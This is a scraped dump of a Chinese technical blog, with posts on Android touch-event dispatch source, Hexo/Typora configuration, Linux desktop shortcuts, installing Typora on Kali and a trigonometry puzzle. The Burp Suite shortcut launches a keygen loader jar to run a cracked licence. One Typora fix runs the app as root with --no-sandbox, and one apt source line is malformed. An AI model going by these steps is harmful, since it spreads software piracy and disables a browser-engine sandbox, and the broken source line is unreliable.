这些方法在调用关系中体现了一个类似‘递归’的调用过程，通过dispatchTouchEvent将事件传递下去，又通过onTouchEvent将事件传递上来。中间的这一过程可以通过让onInterceptTouchEvent方法（对于ViewGroup），或者另外的负责分发的方法返回TRUE，均可以提前终止这一类似’递归‘的调用过程，进而让事件的处理符合我们的预期。"},{"title":"Android事件分发源码","date":"2019-11-21","updated":"2024-03-19","path":"2019/11/21/事件分发源码分析/","text":"activity中传递解析 当我们手指点击手机屏幕的时候，首先会触发activty的dispatchTouchEvent，源码如下： 跟进getWindow() 123public Window getWindow() &#123; return mWindow;&#125; 1private Window mWindow; 发现返回的时Window对象 查看Window对象: 12345678public abstract class Window &#123; /** Flag for the &quot;options panel&quot; feature. This is enabled by default. */ public static final int FEATURE_OPTIONS_PANEL = 0; /** Flag for the &quot;no title&quot; feature, turning off the title at the top * of the screen. */ public static final int FEATURE_NO_TITLE = 1; ... ...&#125; 发现这是一个抽象类, 所以在Activity中搜索window对象的具体创建部分的代码: 很明显,PhoneWindow就是他的具体实现类，所以我们继续跟踪到PhoneWindow的superDispatchTouchEvent源码： 1234@Overridepublic boolean superDispatchTouchEvent(MotionEvent event) &#123; return mDecor.superDispatchTouchEvent(event);&#125; 来康一下这个mDecor是个啥: 12// This is the top-level view of the window, containing the window decor.private DecorView mDecor; 这个view就是activity的顶级view，通过getWindow().getDecorView()可以获取到mDecor对象，他继承FrameLayout，并且我们经常在activity里面通过setContentView加入的view其实就是mDecor的子view。到这里，点击事件已经从activity传到View当中了，接下来要分析的就是顶级View把事件如何分发到各个子view中了。 继续了解mDecor.superDispatchTouchEvent(event)的具体实现： 123public boolean superDispatchTouchEvent(MotionEvent event) &#123; return super.dispatchTouchEvent(event);&#125; 看一下Decor的父类 也就是FrameLayout: 12345@RemoteViewpublic class FrameLayout extends ViewGroup &#123; private static final int DEFAULT_CHILD_GRAVITY = Gravity.TOP | Gravity.START; ....&#125; mDecor继承FrameLayout，所以他的super肯定是ViewGroup，super.dispatchTouchEvent(event)则调用 ViewGroup的dispatchTouchEvent方法，到此点击事件就传递到ViewGroup中。 继续查看ViewGroup的dispatchTouchEvent方法的源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215@Overridepublic boolean dispatchTouchEvent(MotionEvent ev) &#123; if (mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onTouchEvent(ev, 1); &#125; // If the event targets the accessibility focused view and this is it, start // normal event dispatch. Maybe a descendant is what will handle the click. if (ev.isTargetAccessibilityFocus() &amp;&amp; isAccessibilityFocusedViewOrHost()) &#123; ev.setTargetAccessibilityFocus(false); &#125; boolean handled = false; if (onFilterTouchEventForSecurity(ev)) &#123; final int action = ev.getAction(); final int actionMasked = action &amp; MotionEvent.ACTION_MASK; // Handle an initial down. if (actionMasked == MotionEvent.ACTION_DOWN) &#123; // Throw away all previous state when starting a new touch gesture. // The framework may have dropped the up or cancel event for the previous gesture // due to an app switch, ANR, or some other state change. cancelAndClearTouchTargets(ev); resetTouchState(); &#125; // Check for interception. final boolean intercepted; if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) &#123; final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) &#123; intercepted = onInterceptTouchEvent(ev); ev.setAction(action); // restore action in case it was changed &#125; else &#123; intercepted = false; &#125; &#125; else &#123; // There are no touch targets and this action is not an initial down // so this view group continues to intercept touches. intercepted = true; &#125; // If intercepted, start normal event dispatch. Also if there is already // a view that is handling the gesture, do normal event dispatch. if (intercepted || mFirstTouchTarget != null) &#123; ev.setTargetAccessibilityFocus(false); &#125; // Check for cancelation. final boolean canceled = resetCancelNextUpFlag(this) || actionMasked == MotionEvent.ACTION_CANCEL; // Update list of touch targets for pointer down, if needed. final boolean split = (mGroupFlags &amp; FLAG_SPLIT_MOTION_EVENTS) != 0; TouchTarget newTouchTarget = null; boolean alreadyDispatchedToNewTouchTarget = false; if (!canceled &amp;&amp; !intercepted) &#123; // If the event is targeting accessiiblity focus we give it to the // view that has accessibility focus and if it does not handle it // we clear the flag and dispatch the event to all children as usual. // We are looking up the accessibility focused host to avoid keeping // state since these events are very rare. View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus() ? findChildWithAccessibilityFocus() : null; if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; final int actionIndex = ev.getActionIndex(); // always 0 for down final int idBitsToAssign = split ? 1 &lt;&lt; ev.getPointerId(actionIndex) : TouchTarget.ALL_POINTER_IDS; // Clean up earlier touch targets for this pointer id in case they // have become out of sync. removePointersFromTouchTargets(idBitsToAssign); final int childrenCount = mChildrenCount; if (newTouchTarget == null &amp;&amp; childrenCount != 0) &#123; final float x = ev.getX(actionIndex); final float y = ev.getY(actionIndex); // Find a child that can receive the event. // Scan children from front to back. final ArrayList&lt;View&gt; preorderedList = buildTouchDispatchChildList(); final boolean customOrder = preorderedList == null &amp;&amp; isChildrenDrawingOrderEnabled(); final View[] children = mChildren; for (int i = childrenCount - 1; i &gt;= 0; i--) &#123; final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); // If there is a view that has accessibility focus we want it // to get the event first and if not handled we will perform a // normal dispatch. We may do a double iteration but this is // safer given the timeframe. if (childWithAccessibilityFocus != null) &#123; if (childWithAccessibilityFocus != child) &#123; continue; &#125; childWithAccessibilityFocus = null; i = childrenCount - 1; &#125; if (!canViewReceivePointerEvents(child) || !isTransformedTouchPointInView(x, y, child, null)) &#123; ev.setTargetAccessibilityFocus(false); continue; &#125; newTouchTarget = getTouchTarget(child); if (newTouchTarget != null) &#123; // Child is already receiving touch within its bounds. // Give it the new pointer in addition to the ones it is handling. newTouchTarget.pointerIdBits |= idBitsToAssign; break; &#125; resetCancelNextUpFlag(child); if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) &#123; // Child wants to receive touch within its bounds. mLastTouchDownTime = ev.getDownTime(); if (preorderedList != null) &#123; // childIndex points into presorted list, find original index for (int j = 0; j &lt; childrenCount; j++) &#123; if (children[childIndex] == mChildren[j]) &#123; mLastTouchDownIndex = j; break; &#125; &#125; &#125; else &#123; mLastTouchDownIndex = childIndex; &#125; mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); newTouchTarget = addTouchTarget(child, idBitsToAssign); alreadyDispatchedToNewTouchTarget = true; break; &#125; // The accessibility focus didn&#x27;t handle the event, so clear // the flag and do a normal dispatch to all children. ev.setTargetAccessibilityFocus(false); &#125; if (preorderedList != null) preorderedList.clear(); &#125; if (newTouchTarget == null &amp;&amp; mFirstTouchTarget != null) &#123; // Did not find a child to receive the event. // Assign the pointer to the least recently added target. newTouchTarget = mFirstTouchTarget; while (newTouchTarget.next != null) &#123; newTouchTarget = newTouchTarget.next; &#125; newTouchTarget.pointerIdBits |= idBitsToAssign; &#125; &#125; &#125; // Dispatch to touch targets. if (mFirstTouchTarget == null) &#123; // No touch targets so treat this as an ordinary view. handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); &#125; else &#123; // Dispatch to touch targets, excluding the new touch target if we already // dispatched to it. Cancel touch targets if necessary. TouchTarget predecessor = null; TouchTarget target = mFirstTouchTarget; while (target != null) &#123; final TouchTarget next = target.next; if (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) &#123; handled = true; &#125; else &#123; final boolean cancelChild = resetCancelNextUpFlag(target.child) || intercepted; if (dispatchTransformedTouchEvent(ev, cancelChild, target.child, target.pointerIdBits)) &#123; handled = true; &#125; if (cancelChild) &#123; if (predecessor == null) &#123; mFirstTouchTarget = next; &#125; else &#123; predecessor.next = next; &#125; target.recycle(); target = next; continue; &#125; &#125; predecessor = target; target = next; &#125; &#125; // Update list of touch targets for pointer up or cancel, if needed. if (canceled || actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; resetTouchState(); &#125; else if (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) &#123; final int actionIndex = ev.getActionIndex(); final int idBitsToRemove = 1 &lt;&lt; ev.getPointerId(actionIndex); removePointersFromTouchTargets(idBitsToRemove); &#125; &#125; if (!handled &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(ev, 1); &#125; return handled;&#125; 看第19-25行 当点击事件是MotionEvent.ACTION_DOWN时，及手指刚刚触碰屏幕第一个触发的事件，里面调用了两个方法，cancelAndClearTouchTargets(ev)和resetTouchState(); 12345678910111213141516171819202122232425/** * Cancels and clears all touch targets. */private void cancelAndClearTouchTargets(MotionEvent event) &#123; if (mFirstTouchTarget != null) &#123; boolean syntheticEvent = false; if (event == null) &#123; final long now = SystemClock.uptimeMillis(); event = MotionEvent.obtain(now, now, MotionEvent.ACTION_CANCEL, 0.0f, 0.0f, 0); event.setSource(InputDevice.SOURCE_TOUCHSCREEN); syntheticEvent = true; &#125; for (TouchTarget target = mFirstTouchTarget; target != null; target = target.next) &#123; resetCancelNextUpFlag(target.child); dispatchTransformedTouchEvent(event, true, target.child, target.pointerIdBits); &#125; clearTouchTargets(); if (syntheticEvent) &#123; event.recycle(); &#125; &#125;&#125; 123456789/** * 重置所有状态准备新的循环 */ private void resetTouchState() &#123; clearTouchTargets(); resetCancelNextUpFlag(this); mGroupFlags &amp;= ~FLAG_DISALLOW_INTERCEPT; // FLAG_DISALLOW_INTERCEPT 用来阻止父类拦截点击事件 mNestedScrollAxes = SCROLL_AXIS_NONE; &#125; 29-44行 发现有判断父类是否拦截事件的处理代码: 一般两种情况下肯定会调用onInterceptTouchEvent方法： 1.点击事件为MotionEvent.ACTION_DOWN。 2.mFirstTouchTarget ！=null及子类处理点了击事件，因为mFirstTouchTarget 是在dispatchTransformedTouchEvent返回true的时候赋值的 反过来，点击事件MotionEvent.ACTION_DOWN被ViewGroup拦截，及mFirstTouchTarget =null，则后面move，up事件将不在调用onInterceptTouchEvent方法，因为mFirstTouchTarget =null，直接跳过if语句执行下面的else语句。 12final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0;//这个标志位通过requestDisallowInterceptTouchEvent(boolean disallowIntercept)可以控制 61-169行 如果没有被拦截也没有被取消: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697if (!canceled &amp;&amp; !intercepted) &#123; //如果事件的目标是accessiiblity焦点，那么我们会将其提供给具有易访问性焦点的视图，如果它不处理它的话 //我们象往常一样把活动通知给所有的child。 //我们正在查找可访问性集中的主机，以避免保持状态，因为这些事件非常罕见。 View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus() ? findChildWithAccessibilityFocus() : null; if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; final int actionIndex = ev.getActionIndex(); // always 0 for down final int idBitsToAssign = split ? 1 &lt;&lt; ev.getPointerId(actionIndex) : TouchTarget.ALL_POINTER_IDS; // 清理这个指针id的早期触摸目标，以防它们不同步。 removePointersFromTouchTargets(idBitsToAssign); final int childrenCount = mChildrenCount; if (newTouchTarget == null &amp;&amp; childrenCount != 0) &#123; final float x = ev.getX(actionIndex); final float y = ev.getY(actionIndex); // Find a child that can receive the event. // Scan children from front to back. final ArrayList&lt;View&gt; preorderedList = buildTouchDispatchChildList(); final boolean customOrder = preorderedList == null &amp;&amp; isChildrenDrawingOrderEnabled(); final View[] children = mChildren; for (int i = childrenCount - 1; i &gt;= 0; i--) &#123; final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); // 如果有一个具有可访问性焦点的视图，我们希望它首先获得事件，如果不处理，我们将执行正常的分派。我们可以进行两次迭代，但是考虑到时间范围，这样做更安全。 if (childWithAccessibilityFocus != null) &#123; if (childWithAccessibilityFocus != child) &#123; continue; &#125; childWithAccessibilityFocus = null; i = childrenCount - 1; &#125; if (!canViewReceivePointerEvents(child) || !isTransformedTouchPointInView(x, y, child, null)) &#123; ev.setTargetAccessibilityFocus(false); continue; &#125; newTouchTarget = getTouchTarget(child); if (newTouchTarget != null) &#123; // Child is already receiving touch within its bounds. // Give it the new pointer in addition to the ones it is handling. newTouchTarget.pointerIdBits |= idBitsToAssign; break; &#125; resetCancelNextUpFlag(child); if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) &#123; // Child wants to receive touch within its bounds. mLastTouchDownTime = ev.getDownTime(); if (preorderedList != null) &#123; // childIndex points into presorted list, find original index for (int j = 0; j &lt; childrenCount; j++) &#123; if (children[childIndex] == mChildren[j]) &#123; mLastTouchDownIndex = j; break; &#125; &#125; &#125; else &#123; mLastTouchDownIndex = childIndex; &#125; mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); newTouchTarget = addTouchTarget(child, idBitsToAssign); alreadyDispatchedToNewTouchTarget = true; break; &#125; // The accessibility focus didn&#x27;t handle the event, so clear // the flag and do a normal dispatch to all children. ev.setTargetAccessibilityFocus(false); &#125; if (preorderedList != null) preorderedList.clear(); &#125; if (newTouchTarget == null &amp;&amp; mFirstTouchTarget != null) &#123; // 没有找到child来接收事件。 // 将指针分配给最近添加的最少的目标 newTouchTarget = mFirstTouchTarget; while (newTouchTarget.next != null) &#123; newTouchTarget = newTouchTarget.next; &#125; newTouchTarget.pointerIdBits |= idBitsToAssign; &#125; &#125;&#125; 172-210行，事件传递到子View if (mFirstTouchTarget == null)如果条件成立，则说明mFirstTouchTarget 为空，没有被赋值，因为mFirstTouchTarget 是在第146行被赋值，根据分析不执行这行代码的逻辑如下：dispatchTransformedTouchEvent返回false或者点击事件被拦截。总之，就是事件没有被子View处理。这个时候，就入到if语句中，发现就一个方法，如下： 12345// Dispatch to touch targets.if (mFirstTouchTarget == null) &#123; //没有接触的目标，所以把这当作一个普通 view. handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS);&#125; 继续看下dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS);方法的源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 /** * 将运动事件转换为特定子视图的坐标空间 * 过滤掉不相关的指针id，并在必要时覆盖其操作。 * 如果child为null，则假设MotionEvent将被发送到这个ViewGroup。 */ private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel, View child, int desiredPointerIdBits) &#123; final boolean handled; // 取消运动是一种特殊情况。我们不需要执行任何转换 // 或过滤。重要的是行动，而不是内容。 final int oldAction = event.getAction(); if (cancel || oldAction == MotionEvent.ACTION_CANCEL) &#123; event.setAction(MotionEvent.ACTION_CANCEL); if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; handled = child.dispatchTouchEvent(event); &#125; event.setAction(oldAction); return handled; &#125; // 计算要传递的指针的数量。 final int oldPointerIdBits = event.getPointerIdBits(); final int newPointerIdBits = oldPointerIdBits &amp; desiredPointerIdBits; // 如果由于某种原因，我们最终处于一种不一致的状态//可能会产生一个没有指针的动作事件，然后删除该事件。 if (newPointerIdBits == 0) &#123; return false; &#125; // 如果指针的数量相同，并且我们不需要执行任何复杂的不可逆转换，那么我们可以为这个分派重用motion事件，只要我们小心地还原我们所做的任何更改。否则我们需要复印一份。 final MotionEvent transformedEvent; if (newPointerIdBits == oldPointerIdBits) &#123; if (child == null || child.hasIdentityMatrix()) &#123; if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; event.offsetLocation(offsetX, offsetY); handled = child.dispatchTouchEvent(event); event.offsetLocation(-offsetX, -offsetY); &#125; return handled; &#125; transformedEvent = MotionEvent.obtain(event); &#125; else &#123; transformedEvent = event.split(newPointerIdBits); &#125; // 执行任何必要的转换和分派。 if (child == null) &#123; handled = super.dispatchTouchEvent(transformedEvent); &#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; transformedEvent.offsetLocation(offsetX, offsetY); if (! child.hasIdentityMatrix()) &#123; transformedEvent.transform(child.getInverseMatrix()); &#125; handled = child.dispatchTouchEvent(transformedEvent); &#125; // Done. transformedEvent.recycle(); return handled; &#125; 1.android的事件传递是先传递到父类，再到子类的。 2.ViewGroup中可以通过onInterceptTouchEvent方法对事件传递进行拦截，但是子View可以通过requestDisallowInterceptTouchEvent(boolean disallowIntercept)控制父类的拦截事件是否调用。 3.子View消耗掉点击事件后，父类onTouchEvent方法不会调用，子View不消耗点击事件，会传到父类onTouchEvent方法，父类onTouchEvent方法返回false，则最终传递到activity的onTouchEvent方法。 4.ViewGroup一旦调用onInterceptTouchEvent方法拦截点击事件后，本次点击序列事件则都交于该ViewGroup处理，并且onInterceptTouchEvent将不再执行( 见 2.mFirstTouchTarget ！=null及子类…) 5.当dispatchTouchEvent在进行事件分发的时候，只有前一个action返回true，才会触发下一个action.也就是说，子view 未消耗点击事件，及dispatchTouchEvent返回false，这样mFirstTouchTarget =null,则后续action直接由ViewGroup执行，不传递给子View"},{"title":"hexo+typora配置","date":"2019-11-16","updated":"2024-11-11","path":"2019/11/16/hexo-typora配置/","text":"hexo的文章在source/_post/里，图片应该放在public/img/里 配置typora:左上角文件–&gt;首选项–&gt;图像 选择存储到指定位置 /img/$&#123;filename&#125;.assets ，配置完以后再拖入图片就会自动存储到系统/img目录下 编写脚本vim /opt/HexoImgCp/hexoImgCp.sh,写入:cp -r /img/* /var/www/html/blogs/github-pages/public/img/ 目的是将 建立脚本的软连接到/usr/local/bin/hexoImgCp 以后在上传文章到github前先执行一遍hexoImgCp来同步本地图片到hexo目录 2024.11.11更新 hexo init Blog latex的支持：https://www.wzhecnu.cn/2021/08/31/blog/math-tex/ Butterfly 中使用 KaTeX 步骤如下： 更换插件 1复制成功 1234npm un hexo-renderer-marked --save # 卸载 marked 插件npm un hexo-renderer-kramed --save # 卸载 kramed 插件npm i hexo-renderer-markdown-it --save # 安装渲染插件npm install @neilsustc/markdown-it-katex --save # 安装katex插件 修改主题配置文件 _config.butterfly.yml 123456# KaTeXkatex: enable: true per_page: false hide_scrollbar: true 在博客配置文件 _config.yml 中追加代码： 1234567markdown: plugins: - plugin: name: &#x27;@neilsustc/markdown-it-katex&#x27; options: strict: false 1npm install hexo-renderer-pug hexo-renderer-stylus --save 1npm i hexo-blog-encrypt hexo-wordcount --save 新的npm包 12345678910111213141516171819202122hexo-site@0.0.0 F:\\Blog ├── @neilsustc/markdown-it-katex@1.0.0 ├── @upupming/hexo-renderer-markdown-it-plus@2.0.2 ├── hexo-asset-image@1.0.0 ├── hexo-blog-encrypt@3.1.9 ├── hexo-butterfly-extjs@1.4.15 ├── hexo-deployer-git@4.0.0 ├── hexo-generator-archive@2.0.0 ├── hexo-generator-category@2.0.0 ├── hexo-generator-index@4.0.0 ├── hexo-generator-json-content@4.2.3 ├── hexo-generator-search@2.4.3 ├── hexo-generator-tag@2.0.0 ├── hexo-renderer-ejs@2.0.0 ├── hexo-renderer-markdown-it@7.1.1 ├── hexo-renderer-pug@3.0.0 ├── hexo-renderer-stylus@3.0.1 ├── hexo-server@3.0.0 ├── hexo-theme-landscape@1.0.0 ├── hexo-wordcount@6.0.1 └── hexo@7.3.0 旧的npm包 123456789101112131415161718192021222324252627282930313233λ npm list(node:13356) ExperimentalWarning: CommonJS module C:\\Users\\hasee\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\debug\\src\\node.js is loading ES Module C:\\Users\\hasee\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\supports-color\\index.js using require().Support for loading ES Module in require() is an experimental feature and might change at any time(Use `node --trace-warnings ...` to show where the warning was created)hexo-site@0.0.0 F:\\Blog├── @neilsustc/markdown-it-katex@1.0.0├── @upupming/hexo-renderer-markdown-it-plus@2.0.2├── @waline/client@2.4.0├── algoliasearch@4.13.0├── core-js@3.22.5├── formidable@3.2.3├── hexo-algolia@1.3.2├── hexo-asset-image@0.0.5 (git+ssh://git@github.com/CodeFalling/hexo-asset-image.git#3c114cf0c0343ab28469635085b225fcae7fb9d3)├── hexo-blog-encrypt@3.1.6├── hexo-butterfly-extjs@1.1.7├── hexo-deployer-git@3.0.0├── hexo-generator-archive@0.1.5├── hexo-generator-category@0.1.3├── hexo-generator-index-pin-top@0.2.2├── hexo-generator-index@2.0.0├── hexo-generator-json-content@4.2.3├── hexo-generator-search@2.4.3├── hexo-generator-tag@0.2.0├── hexo-renderer-ejs@0.3.1├── hexo-renderer-jade@0.4.1├── hexo-renderer-markdown-it@6.0.1├── hexo-renderer-pug@3.0.0├── hexo-renderer-stylus@0.3.3├── hexo-server@0.3.3├── hexo-wordcount@6.0.1├── hexo@6.2.0├── mkdirp@1.0.4└── save@2.5.0 2024.11.06更新: Hexo更新后，根据官方文档https://hexo.io/zh-cn/docs/asset-folders，想要插入图片要不就使用asset标签插件，要不就使用`markdown-marked`插件。但是这两种插入方式对markdown的本地编写都不友好，本地编写插入的图片路径和它生成的路径是不一样的（ps：越改越蠢的设计）。 要想使用markdown原生的图片插入方法，参考下面两篇博客找到解决方法，首先卸载markdown-marked插件。安装hexo-asset-image插件，然后修改此插件的index.js文件如下： https://alvincr.com/2021/01/hexo-with-github_pages/ https://wangwei1237.github.io/2020/02/05/handle-the-bug-of-hexo-asset-image-plugin/ 1 node_modules/hexo-asset-image/index.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;use strict&#x27;;var cheerio = require(&#x27;cheerio&#x27;);// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split(&#x27;.&#x27;);hexo.extend.filter.register(&#x27;after_post_render&#x27;, function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, &#x27;/&#x27;, 1) + 1; else var beginPos = getPosition(link, &#x27;/&#x27;, 3) + 1; // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;. var endPos = link.lastIndexOf(&#x27;/&#x27;) + 1; link = link.substring(beginPos, endPos); var toprocess = [&#x27;excerpt&#x27;, &#x27;more&#x27;, &#x27;content&#x27;]; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $(&#x27;img&#x27;).each(function()&#123; if ($(this).attr(&#x27;src&#x27;))&#123; // For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;. var src = $(this).attr(&#x27;src&#x27;).replace(&#x27;\\\\&#x27;, &#x27;/&#x27;); if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp; !/^\\s*\\//.test(src)) &#123; // For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed. // In addition, to support multi-level local directory. var linkArray = link.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27;; &#125;); var srcArray = src.split(&#x27;/&#x27;).filter(function(elem)&#123; return elem != &#x27;&#x27; &amp;&amp; elem != &#x27;.&#x27;; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join(&#x27;/&#x27;); $(this).attr(&#x27;src&#x27;, config.root + link + src); console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 2019.11.23更新: 上述方法不利于资源的管理，也不利于平台之间的同步，所以更换了方法 typora的更改 图像存储位置"},{"title":"linux添加快捷方式_burpsuite为例","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/linux添加快捷方式-burpsuite为例/","text":"安装软件burpsuite_pro 设置bash窗口的启动命令 在/usr/share/applications/目录下创建burpsuite_pro.desktop填入以下内容: 123456789[Desktop Entry]Name=BurpsuiteProComment=burpsuite_pro in /opt/burpsuiteGenericName=Web toolExec=java -Xbootclasspath/p:/opt/burpsuite/burp-loader-keygen.jar -jar /opt/burpsuite/burpsuite_pro_v1.7.37.jarIcon=/usr/share/icons/hicolor/48x48/apps/kali-burpsuite.pngType=ApplicationStartupNotify=true 此时在显示应用程序中就有burpsuite的快捷方式啦"},{"title":"Desktop文件","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/Desktop文件/","text":"参考网址 %U A list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path. 也就是说，加入了%U参数，可以传递多个URL给Chrome浏览器，浏览器会依次打开各URL。比如您在文件管理器中选择了多个html文件，然后在鼠标右键菜单中点击”Open with Google Chrome”，Chrome浏览器就会依次打开所选的网页。 Exec后面可以跟上执行参数,之后每次点击图标都会带着执行参数执行 例如 Exec typora --no-sandbax %U"},{"title":"查看apt-get安装包路径","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/查看apt-get安装包路径/","text":"1dpkg -L [软件包名] apt-get 所下载的用于安装的软件包，在 /var/cache/apt/archives 中。如果执行过 apt-get clean ，那么原始下载的包就找不到了。"},{"title":"kali安装Typora","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/kali安装Typora/","text":"按照官网安装 Typora官网 12345678910# or use# sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAEwget -qO - https://typora.io/linux/public-key.asc | sudo apt-key add -# add Typora&#x27;s repositorysudo add-apt-repository &#x27;deb https://typora.io/linux ./&#x27;sudo apt-get update# install typorasudo apt-get install typora 注意： kali不自带add-apt-repository , 需要手动安装 , 安装过程见文章:&quot;kali安装add-apt-repository&quot; 手动添加apt源安装 首先添加秘钥: apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAE vim /etc/apt/source.list 添加如下源: 1234# Typoradeb https://typora.io/linux ./deb http://ppa.launchpad.net/noobslab/macbuntu/ubuntu bionic maindeb http://ppa.launchpad.net///typora.io/linux .//ubuntu bionic main 下载binary文件 下载binary文件 tar zxvf [bin文件] cd Typora-linux-x64 ./Typora (运行出错的话继续往下看) 出错及解决方式 直接运行typora会提示错误信息: [8560:1116/192508.457291:FATAL:atom_main_delegate.cc(210)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180. 追踪与中断点陷阱 运行时手动加上 typora --no-sandbox(太麻烦,不推荐) 查看安装路径dpkg -L typora发现桌面图标在/usr/share/applications/typora.desktop ， 可执行文件在/usr/share/typora. /usr/bin/typora指向了 /usr/share/Typorax-special/nautilus-clipboard 修复通过快捷方式的启动方法(点击桌面图标启动) vim /usr/share/applications/typora.desktop 在Exec typora后面添加 --no-sandbox 这样在点击桌面图标时就可以正常启动啦 修复通过命令行启动的方法 建立启动脚本： 在/usr/share/typora/下新建Typora_Start.sh 然后向其中写入:/usr/share/typora/Typora --no-sandbox (不要写成typora --no-sandbox, 不然会造成无限递归启动)] 删除原/usr/bin/typora : rm /usr/bin/typora 建立新链接: ln -s /usr/share/typora/Typora_Start.sh /usr/bin/typora 大功告成!"},{"title":"kali安装add-apt-repository","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/kali安装add-apt-repository/","text":"Kali Linux 默认是没有 add-apt-repository 的，当我们需要安装一些第三方提供的软件时，则无法通过 apt 来安装。因此需要先安装并配置 add-apt-repository。 安装软件属性程序包 apt install software-properties-common 安装 apt-file apt install apt-file 更新 apt-file apt-file update 搜索 add-apt-repository apt-file search add-apt-repository"},{"title":"利用三角函数得出任意一个正有理数","date":"2019-11-16","updated":"2024-03-19","path":"2019/11/16/利用三角函数得出任意一个正有理数/","text":"给定实数x，一步操作可选择将其变为sin(x),cos(x),tan(x),arcsin(x),arccos(x),arctan(x)，初始时x=0，求证对于任意的正有理数q，可经过有限次操作后使x=q。据说是美国数学奥林匹克的一道题 构造非常巧妙： 1.构造函数f(x)=1/x，x为任意非零实数，小证一下： 2.构造函数g(x)=√(x^2+1)，x为正实数： 接下来的步骤就神奇了。我们假设在操作过程中，y总等于x的平方。对x进行操作，看看y值如何变化： 这样可以完成对y的取倒数和加1工作，将g’(y)迭代多次可以将y加任意一个正整数。还要注意一点：使用f,g函数时，x始终为正实数，这样保证了x与y一一对应。初始时y=0，目标y=q^2，而q^2显然是有理数，设q^2=u/v，u,v为互质正整数，我们可以利用辗转相除的思想。 不妨举个例子：目标（y）为49/9。 可以看到，实际上我们把49/9化为了有限连分数，我们的操作顺序就很清楚了：用4次g函数，取倒数，用2次g函数，取倒数，用5次g函数即可，得到y=49/9,相应地x=7/3。 问题已经得到解决，并且我们还可以得出任意正有理数的算术平方根。"},{"title":"有序无序广播","date":"2019-11-15","updated":"2024-03-19","path":"2019/11/15/有序无序广播/","text":"特殊广播 **特殊的广播：**指那些操作比较频繁的广播事件类型。如：屏幕的开、关广播，电量的变化广播等等 这种特殊的广播事件在 